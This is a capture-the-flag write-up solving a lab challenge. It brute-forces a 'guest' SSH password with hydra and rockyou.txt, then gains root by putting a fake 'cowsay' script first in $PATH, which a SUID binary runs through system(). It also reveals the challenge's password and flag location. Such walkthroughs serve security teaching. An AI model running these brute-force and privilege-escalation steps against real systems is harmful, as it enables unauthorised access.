# Super secret data - healthcheck

**Note: the IP/hostname and port may be different, in this case the IP is `172.17.0.8` and the port is 2137**

We can try to SSH into the port using the `guest` user - the username is hinted in the challenge description.

```shell
$ ssh guest@172.17.0.8 -p 2137
guest@172.17.0.8's password:
```
The server prompts for a password. It can be guessed (somehow) or bruteforced using a word list like `rockyou.txt`. This can be using using `hydra` among other tools.

```shell
$ hydra -l guest -P rockyou.txt ssh://172.17.0.8:2137
```
*This can take several minutes depending on the hardware.*

Eventually the password is revealed to be `beautiful1`, line number 1150 in `rockyou.txt`.

Now we can log into the server. The user is greeted with a friendly cow.

```
 ___________________
< I am a super cow! >
 -------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

This cow turns out not to be the regular `cowsay` command, but instead a file named `supercowsay` in the home directory of the guest user. The file is owned by the `root` user and has SUID set, meaning it will always be run as `root` no matter the user that runs it.

The binary can be dissembled by `objdump`.

```shell
$ objdump -M intel -d supercowsay
```

By inspecting the output we can see that the binary is calling the C standard library `system` function. We can suspect that the function is calling the system `cowsay` binarny, which can be further confirmed by running for example `strings supercowsay | grep cowsay`.

We now know that the binary is executing commands as `root`, so we can change the `$PATH` in order for `cowsay` to point to a different command which would give us privilege escalation.

We can create a script in `/home/guest` named `cowsay`:

```shell
#!/bin/bash

/bin/bash #or any other command we want to run as root
```
Then we edit the `$PATH` to include the directory our script is in.

```shell
export PATH=/home/guest:$PATH
```
*Note: It's important for `/home/guest` to be at the beginning, so the shell checks it before it checks `/usr/bin`, where the real `cowsay` lives.*

After that, we can run the script and voilà, we are `root`. The flag can be quickly found in `/root/flag`.

Hope you had fun solving this challenge!








